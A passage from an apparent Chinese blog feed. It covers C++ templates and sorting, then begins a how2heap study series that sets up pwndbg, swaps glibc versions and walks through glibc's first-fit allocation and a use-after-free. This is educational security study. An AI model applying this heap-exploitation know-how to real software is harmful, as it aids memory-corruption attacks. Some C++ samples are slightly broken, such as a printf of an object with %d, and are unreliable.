class="hljs-title">x</span>, <span class="hljs-title">T</span> &amp; <span class="hljs-title">y</span>)</span><br><span class="hljs-class">&#123;</span><br>    T tmp = x;<br>    x = y;<br>    y = tmp;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像这样，它用 T 代替了普通函数定义中的数据类型，代表一种泛化类型。<br>T 是类型参数，代表类型。<br>编译器由模板自动生成函数时，会用具体的类型名对模板中所有的类型参数进行替换，其他部分则原封不动地保留。同一个类型参数只能替换为同一种类型。编译器在编译到调用函数模板的语句时，会根据实参的类型判断该如何替换模板中的类型参数。</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>首先，找到数组中最小的元素，拎出来，将它和数组的第一个元素交换位置，第二步，在剩下的元素中继续寻找最小的元素，拎出来，和数组的第二个元素交换位置，如此循环，直到整个数组排序完成。<br><img src="https://cdn.nlark.com/yuque/0/2021/gif/1629942/1624000947793-fff1bd3e-dd53-4884-bbc8-918dec271a9c.gif#height=387&id=u26cb77fa&originHeight=538&originWidth=955&originalType=binary%E2%88%B6=1&status=done&style=none&width=687"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length;i++)&#123;<br>        <span class="hljs-keyword">int</span> min = i;<span class="hljs-comment">//只需要记录最小值的位置即可！</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; length;j++)&#123;<br>            <span class="hljs-keyword">if</span> (num[min] &gt; num[j])&#123;<br>                min = j;<span class="hljs-comment">//更新最小位置</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-keyword">int</span> temp = num[min];<br>            num[min] = num[i];<br>            num[i] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度和冒泡一模一样，都是 O(n2)。</p><p>#</p><h1 id="STL-库函数-sort"><a href="#STL-库函数-sort" class="headerlink" title="STL 库函数 sort"></a>STL 库函数 sort</h1><p>编写 C++经常需要使用 sort 进行排序，有可能是简单的数组、数字 vector 或者是复杂一点的存放对象的 vector。<br>C++为了满足用户的需求，在 algorithm 里面封装了 sort 泛型算法。所以使用时，必须<code>#include &lt; algorithm&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>);</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>, <span class="hljs-title">class</span> <span class="hljs-title">Compare</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>, <span class="hljs-title">Compare</span> <span class="hljs-title">comp</span>);</span><br></code></pre></td></tr></table></figure><p>可以看见，sort 原型分为两个，区别在于第一个函数有两个参数，第一个函数有三个参数。<br>其中两个函数都有的是 <code>RandomAccessIterator</code> 是随机访问迭代器，first 是初始位置，last 是末尾位置，默认使用迭代器引用的 <code>operator &lt; </code>进行排序。<br>第二个函数，前两个参数一样，也是用来说明从哪儿到哪儿排序。第三个参数是<code>Compare</code>，意思是使用 comp 这个“方法”对对象进行排序。<code>comp</code>可以是函数对象或者是函数指针。</p><h2 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h2><ul><li>两个参数</li></ul><p>使用两个参数这应该是最普遍也是最简单的情景，如果只有两个参数，默认使用 operator &lt; 对数组排序，结果为<strong>升序</strong>。</p><h3 id="对数组排序"><a href="#对数组排序" class="headerlink" title="对数组排序"></a>对数组排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> arr[] = &#123; <span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span> &#125;;<br>sort(arr, arr + <span class="hljs-number">9</span>);<br></code></pre></td></tr></table></figure><p>需要注意的是，这里传入的是迭代器，所以要传入头指针和末尾指针（最后一个待排元素的后一个位置）,数组的话，变量名就是起始地址。</p><h3 id="对-vector-排序"><a href="#对-vector-排序" class="headerlink" title="对 vector 排序"></a>对 vector 排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; arr;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>;i &gt;<span class="hljs-number">0</span>;i--)&#123;<br>    arr.push_back(i);<br>&#125;<br>sort(arr.begin(),arr.end());<br></code></pre></td></tr></table></figure><p>这里直接传入 vector 的 begin 和 end 两个迭代器就对整个 vector 完成了排序。</p><h3 id="对对象排序"><a href="#对对象排序" class="headerlink" title="对对象排序"></a>对对象排序</h3><p>如果<strong>只使用两个参数的话</strong>，要对对象排序，那么<strong>只能依靠重载运算符</strong>来实现。而且必须<strong>重载的是 &lt; 关系运算符</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> value;<br>    Test() : value(<span class="hljs-number">0</span>) &#123;&#125;;<br>    Test(<span class="hljs-keyword">int</span> x) : value(x) &#123;&#125;;<br><br>    <span class="hljs-comment">// 重载运算符</span><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> Test&amp; t) &#123;<br>        <span class="hljs-keyword">if</span> (value &lt; t.value)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">vector</span>&lt;Test&gt; arr;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>    arr.push_back(Test(i));<br>&#125;<br>sort(arr.begin(), arr.end());<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;arr.size();i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，就根据 Test 类中 value 的值来升序排对象的顺序了。</p><h3 id="三个参数排序"><a href="#三个参数排序" class="headerlink" title="三个参数排序"></a>三个参数排序</h3><p>先不写了</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==%E2%88%A3=2247486587&idx=1&sn=7becbafba2658a4c6bf901ee65dd5277&chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&mpshare=1&scene=1&srcid=">https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==∣=2247486587&amp;idx=1&amp;sn=7becbafba2658a4c6bf901ee65dd5277&amp;chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&amp;mpshare=1&amp;scene=1&amp;srcid=</a></li><li>视频 | 手撕九大经典排序算法，看我就够了！ - 力扣（LeetCode）的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/52884590">https://zhuanlan.zhihu.com/p/52884590</a></li><li><a href="https://blog.csdn.net/qq_46018418/article/details/106341404">https://blog.csdn.net/qq_46018418/article/details/106341404</a></li><li><a href="https://www.cnblogs.com/scyq/p/13053177.html">https://www.cnblogs.com/scyq/p/13053177.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> PAT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>How2heap系列</title>
      <link href="/2021/How2heap%E7%B3%BB%E5%88%97/"/>
      <url>/2021/How2heap%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622445587922-c664f9cc-f070-4d9c-a8fe-be7c909b0a53.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&name=image.png&originHeight=241&originWidth=756&originalType=binary%E2%88%B6=1&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p><a id="more"></a><h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450689286-242405c0-da07-4c1c-ad77-236b1ad0719a.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&name=image.png&originHeight=362&originWidth=534&originalType=binary%E2%88%B6=1&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p><h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469260530-70e29cd8-6fc3-4252-8a81-cb96056c3927.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&name=image.png&originHeight=656&originWidth=1195&originalType=binary%E2%88%B6=1&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469273877-6dfd3d64-636b-47a4-ad9d-3f5555b519bb.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&name=image.png&originHeight=714&originWidth=1202&originalType=binary%E2%88%B6=1&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469300251-c5bf17b9-384d-4f62-afd7-54240544a4aa.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&name=image.png&originHeight=648&originWidth=1206&originalType=binary%E2%88%B6=1&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469311913-91a92533-e0c6-42ea-ae84-6f5e8df5640b.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&name=image.png&originHeight=178&originWidth=1199&originalType=binary%E2%88%B6=1&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p><h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p><blockquote><p>这个版本是通过</p></blockquote><p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476552690-d31a7737-0123-4d85-95b8-f3817bc2c993.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&name=image.png&originHeight=476&originWidth=1052&originalType=binary%E2%88%B6=1&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p><p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code></p><p>大功告成<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476736461-1b38c6e4-2550-4dff-a823-5800d51c10a5.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&name=image.png&originHeight=349&originWidth=1285&originalType=binary%E2%88%B6=1&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p><h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450724910-c67d6615-227c-4b6f-84fe-004d96a9c21f.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&name=image.png&originHeight=651&originWidth=1122&originalType=binary%E2%88%B6=1&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450734858-091f3c86-b244-4657-857a-0d74f59ceab4.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&name=image.png&originHeight=85&originWidth=393&originalType=binary%E2%88%B6=1&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451433938-1f76f4f9-3dea-4fa5-a6df-f306e7409e70.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&name=image.png&originHeight=878&originWidth=1160&originalType=binary%E2%88%B6=1&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451474679-dad746d5-93f4-4eb3-acae-c5f71d628011.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&name=image.png&originHeight=443&originWidth=501&originalType=binary%E2%88%B6=1&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451532576-69ce5439-7a51-4173-b8fb-b1117cbe000b.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=ub33635ce&name=image.png&originHeight=57&originWidth=317&originalType=binary%E2%88%B6=1&size=24302&status=done&style=none&taskId=u1e352d62-d807-4c64-9204-cbe87c066c7&width=158.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451544941-7545c484-68bf-4cf3-b827-e82efaf7955f.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&name=image.png&originHeight=57&originWidth=321&originalType=binary%E2%88%B6=1&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">    An allocated chunk looks like <span class="hljs-keyword">this</span>:<br>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of previous chunk, if unallocated (P clear)  |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of chunk, in bytes                     |A|M|P|<br>      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             User data starts here...                          .<br>    .                                                               .<br>    .             (malloc_usable_size() bytes)                      .<br>    .                                                               |<br>nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             (size of chunk, but used <span class="hljs-keyword">for</span> application data)    |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of next chunk, in bytes                |A|<span class="hljs-number">0</span>|<span class="hljs-number">1</span>|<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br><br></code></pre></td></tr></table></figure><p>其中 chunk 定义的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li><li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451710162-f4347035-8d3d-4e0b-9a50-8e8fb749e46a.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=u603191a2&name=image.png&originHeight=80&originWidth=558&originalType=binary%E2%88%B6=1&size=61499&status=done&style=none&taskId=u335c52b3-4dab-460d-9193-4dc8dd5009a&width=279" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451733665-082ef39a-f546-42c4-9dd3-8ae40da7e984.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&name=image.png&originHeight=78&originWidth=568&originalType=binary%E2%88%B6=1&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p><blockquote><p>GDB 调试查看 Chunk 内存的时候，在 32 位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p></blockquote><p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451794181-163a21cc-95f7-4b83-8bc4-86d853c7b1af.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&name=image.png&originHeight=594&originWidth=951&originalType=binary%E2%88%B6=1&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451892237-78d21890-285a-46db-b78a-d481a1ae8fc6.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary%E2%88%B6=1&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451986494-0574d6cd-5e6f-4a42-9fe9-6dbaba1f1458.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary%E2%88%B6=1&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452017378-c8a73946-f457-4dbf-9937-7d26539c47e7.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&name=image.png&originHeight=449&originWidth=864&originalType=binary%E2%88%B6=1&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452091035-06911094-70f2-42b8-938b-fbddf86fbd8c.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary%E2%88%B6=1&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452218412-b30b1052-1138-4417-a880-516e7871f6dc.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary%E2%88%B6=1&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452271852-a54c0318-b76a-4105-9647-35d5ca08f5cc.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary%E2%88%B6=1&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452403013-31d75fbc-1613-45f9-999f-1944dd41641f.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&name=image.png&originHeight=644&originWidth=1129&originalType=binary%E2%88%B6=1&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452430970-0e0817d2-dec3-4db2-ba21-fb64206518da.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&name=image.png&originHeight=59&originWidth=573&originalType=binary%E2%88%B6=1&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 